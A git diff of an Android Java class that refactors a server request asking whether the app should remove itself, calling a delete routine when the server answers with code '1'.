@@ -1,18 +1,21 @@
 package com.inet.android.request;
 
-import java.io.IOException;
+import java.io.UnsupportedEncodingException;
+import java.util.concurrent.TimeUnit;
 
+import org.apache.http.Header;
+import org.apache.http.message.BasicHeader;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
-import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 
-import com.inet.android.db.RequestDataBaseHelper;
+import com.inet.android.bs.ServiceControl;
 import com.inet.android.utils.Logging;
+import com.loopj.android.http.RequestParams;
 
 /**
  * DelRequest class is designed to stop the program
@@ -22,100 +25,109 @@ import com.inet.android.utils.Logging;
  */
 public class DelRequest extends DefaultRequest {
 	private final String LOG_TAG = DelRequest.class.getSimpleName().toString();
-	static RequestDataBaseHelper db;
-	SharedPreferences sp;
-	Context mContext;
+	private Context mContext;
+	private SharedPreferences sp;
+	private Editor ed;
 
 	public DelRequest(Context ctx) {
 		super(ctx);
 		this.mContext = ctx;
 		sp = PreferenceManager.getDefaultSharedPreferences(ctx);
+		ed = sp.edit();
 	}
 
 	@Override
-	public void sendRequest(String request) {
-		DelTask srt = new DelTask();
-		srt.execute(request);
-	}
+	public void sendRequest() {
+		final Header[] headers = {
+				new BasicHeader("Accept", "application/json"),
+				new BasicHeader("Authorization", "Bearer "
+						+ sp.getString("access_first_token", "")) };
+		Logging.doLog(
+				LOG_TAG,
+				"send start request, account: "
+						+ sp.getString("account", "account"));
+		RequestParams params = new RequestParams();
+		params.put("account", sp.getString("account", "0000"));
+		params.put("device", sp.getString("device", "0000"));
+		params.put("key", sp.getString("key_removal", "-1"));
+		params.put("mode", "1");
 
-	class DelTask extends AsyncTask<String, Void, Void> {
-		@Override
-		protected Void doInBackground(String... strs) {
-			sendPostRequest(strs[0]);
-			return null;
-		}
+		final TestCaller caller = TestCaller.getInstance();
+		caller.makeRequest(mContext, AppConstants.DEL_LINK, headers, params,
+				new RequestListener() {
+
+					@Override
+					public void onSuccess(int arg0, Header[] arg1,
+							JSONObject timeline) {
+						// TODO Auto-generated method stub
+
+					}
+
+					@Override
+					public void onFailure(int arg0, byte[] errorResponse) {
+						// TODO Auto-generated method stub
+						if (arg0 == 401) {
+							caller.sendRequestForFirstToken(mContext);
+							try {
+								// TimeUnit.SECONDS.sleep(1);
+								TimeUnit.MILLISECONDS.sleep(1000);
+							} catch (InterruptedException e) {
+								e.printStackTrace();
+							}
+							sendRequest();
+						}
+					}
+
+					@Override
+					public void onSuccess(int arg0, Header[] arg1,
+							byte[] response) {
+						// TODO Auto-generated method stub
+						Parser parser = new Parser(mContext);
+						String[] del = null;
+						try {
+							del = parser.parsing(response);
+						} catch (UnsupportedEncodingException e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						} catch (JSONException e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						}
+						if (del[0] != null) {
+							ed.putString("code_del", del[0]);
+							if (del[0].equals("1")) {
+								Logging.doLog(LOG_TAG, "total annihilation",
+										"total annihilation");
+								ServiceControl.deleteApp(mContext);
+							} else if (del[0].equals("0"))
+								DisassemblyErrors.setError(del[1], mContext);
+
+							ed.commit();
+						}
+					}
+				});
+
 	}
 
 	@Override
 	protected void sendPostRequest(String request) {
-		String str = null;
-
-		try {
-			Logging.doLog(LOG_TAG, request, request);
-			str = Caller.doMake(request,
-					sp.getString("access_first_token", ""),
-					ConstantValue.DEL_LINK, true, null, ctx);
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-
-		if (str != null && str.length() > 3) {
-			getRequestData(str);
-		} else if (str.length() == 3) {
-			Logging.doLog(LOG_TAG, "error: " + str, "error: " + str);
-			DisassemblyErrors.setError(str, "", ConstantValue.TYPE_DEL_REQUEST, -1,
-					"", -1, mContext);
-			RequestList.sendRequestForFirstToken(mContext);
-		} else {
-			Logging.doLog(LOG_TAG,
-					"response from the server is missing or incorrect",
-					"response from the server is missing or incorrect");
-		}
-
 	}
 
 	@Override
 	protected void getRequestData(String response) {
-		Logging.doLog(LOG_TAG, "getResponseData: " + response,
-				"getResponseData: " + response);
 
-		Editor ed = sp.edit();
-
-		JSONObject jsonObject = null;
-		try {
-			jsonObject = new JSONObject(response);
-		} catch (JSONException e) {
-			if (response == null) {
-				Logging.doLog(LOG_TAG, "json null", "json null");
-			}
-			return;
-		}
-
-		String str = null;
-		try {
-			str = jsonObject.getString("code");
-		} catch (JSONException e) {
-			e.printStackTrace();
-		}
-		if (str != null) {
-			ed.putString("code_del", str);
-		} else {
-			ed.putString("code_del", "code");
-		}
-
-		if (str.equals("1")) {
-			Logging.doLog(LOG_TAG, "total annihilation", "total annihilation");
-		}
-		if (str.equals("0")) {
-			DisassemblyErrors.setError(response, mContext);
-		}
-		ed.commit();
 	}
 
 	@Override
 	public void sendRequest(int request) {
 		// TODO Auto-generated method stub
 
+	}
+
+	@Override
+	public void sendRequest(String request) {
+		// TODO Auto-generated method stub
+		
 	}
 
 }
